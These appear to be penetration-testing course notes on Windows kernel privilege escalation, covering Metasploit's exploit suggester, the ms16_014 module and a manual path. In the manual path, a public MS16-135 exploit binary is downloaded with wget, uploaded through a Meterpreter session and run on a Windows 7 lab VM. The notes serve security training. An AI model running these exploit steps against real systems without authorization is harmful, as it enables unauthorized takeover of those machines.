Privilege Escalation
- Privilege escalation is the process of exploiting vulnerabilities or misconfigurations in systems to elevate privileges from one user to another, typically to a user with administrative or root access on a system.
- Privilege escalation is a vital element of the attack life cycle and is a major determinant in the overall success of a penetration test.
- After gaining an initial foothold on a target system you will be required to elevate your privileges in order to perform tasks and functionality that require administrative privileges.
- The importance of privilege escalation in the penetration testing process cannot be overstated or overlooked. Developing your privilege escalation skills will mark you out as a good penetration tester.

Windows Kernel
- A Kernel is a computer program that is the core of an operating system and has complete control over every resource and hardware on a system. It acts as a translation layer between hardware and software and facilitates the communication between these two layers.
- Windows NT is the kernel that comes pre-packaged with all versions of Microsoft Windows and operates as a traditional kernel with a few exceptions based on user design philosophy. It consists of two main modes of operation that determine access to system resources and hardware.
	- User Mode: Programs and services running in user mode have limited access to system resources and functionality.
	- Kernel Mode: Kernel mode has unrestricted access to system resources and functionality with added functionality of managing devices and system memory.

Windows Kernel Exploitation
- Kernel exploits on Windows will typically target vulnerabilities in the Windows kernel to execute arbitrary code in order to run privileged system commands or to obtain a system shell.
- The process of exploitation will differ based on the version of Windows being targeted and the kernel exploit being used.
- Windows Kernel exploitation is not a recommended privilege escalation vector, since it can lead to system crashes or loss of data. It is not recommended to use Kernel exploits in an enterprise network.
- Privilege escalation on Windows systems will typically follow the following methodology:
	- Identifying kernel vulnerabilities.
	- Downloading, compiling and transferring kernel exploits onto the target system.

Tools & Environment
- Windows Exploit Suggester - This tool compares a target's patch levels against the Microsoft vulnerability database in order to detect potential missing patches on the target. It also notifies the user if there are public exploits and Metasploit modules available for the missing bulletins.
	- GitHub: https://www.github.com/AonCyberLabs/Windows-Exploit-Suggester
- Windows-Kernel-Exploits - A collection of Windows Kernel exploits sorted by CVEs.
	- GitHub: https://www.github.com/SecWiki/windows-kernel-exploits/

Note: The techniques demonstrated in this video are performed on a Windows 7 SP1 VM.

Practical Demonstration
- Since the demonstration is for Privilege escalation, we are in an assumed breach scenario with non-elevated privileges, and have a PowerShell and a Meterpreter session, both with the user Accountant, who does not have elevated privileges.
- Automated privilege escalation using Metasploit Framework:
	- `sessions`
	- `sessions 3`
	- Meterpreter Session
		- `getuid`
		- `getprivs`
	- Automated Privilege Escalation on a Meterpreter session:
		- `getsystem`
	- Using the `local_exploit_suggester` post-exploit module to check against, collect and list local exploits:
		- `search suggester`
		- `use post/multi/recon/local_exploit_suggester`
		- `options`
		- `set SESSION 3`
		- `run`
	- Attempting privilege escalation with an exploit that the exploit suggester module verified the target system to be vulnerable to: 
		- `use exploit/windows/local/ms16_014_wmi_recv_notif`
		- `options`
		- `set SESSION 3`
		- `set LPORT 4422`
		- The LPORT value in this case should be a value not currently being used, so we cannot use the value that an ongoing shell session is currently working on.
		- `exploit`
		- Meterpreter session:
			- `getuid`
- Manual privilege escalation using Windows-Exploit-Suggester and publicly available PoC exploits:
	- `sessions`
	- `sessions 3`
	- Meterpreter session:
		- `getuid`
		- `getprivs`
		- `shell`
		- Windows Command Prompt:
			- `systeminfo`
			- The information we get from the execution of the `systeminfo` command should be copied into a file, in this case the file we created to save the information is named `win7-sysinfo.txt`, on our attack machine, since we need it later on to perform vulnerability scanning for kernel exploits using Windows-Exploit-Suggester.
	- `git clone https://www.github.com/AonCyberLabs/Windows-Exploit-Suggester`
	- `cd Windows-Exploit-Suggester`
	- `./windows-exploit-suggester.py --update`
	- `./windows-exploit-suggester.py --database 2024-10-31-mssb.xls --systeminfo ~/win7-sysinfo.txt`
		- The output of this tool has the results sorted in a descending order of exploit success rate, so the exploits at the top will be the most likely to work successfully.
		- \[E] represents the availability of a exploitdb PoC, \[M] represents the availability of a Metasploit module, and \[\*] represents a missing bulletin.
	- We can learn more about the exploits mentioned in the result, and how to use them, by researching online using the exploit's CVE code or Microsoft Security Bulletin code.
	- In this demonstration, we first consider a vulnerability with the Microsoft Security Bulletin code MS16-135, research about it online and find a PoC with its source code and a compiled binary `https://www.github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-135/`.
	- `wget https://www.github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-135/41015.exe`
	- We downloaded the compiled binary locally to use the exploit code.
	- Now, we will use our non-privileged Meterpreter session on the target system to upload the exploit code binary, and execute it:
		- `cd C:\\`
		- `ls`
		- `cd Temp\\`
		- `ls`
		- `upload ~/41015.exe`
		- `shell`
		- Windows Command Prompt:
			- `dir`
			- `.\41015.exe`
			- `.\41015.exe 7`
			- `whoami`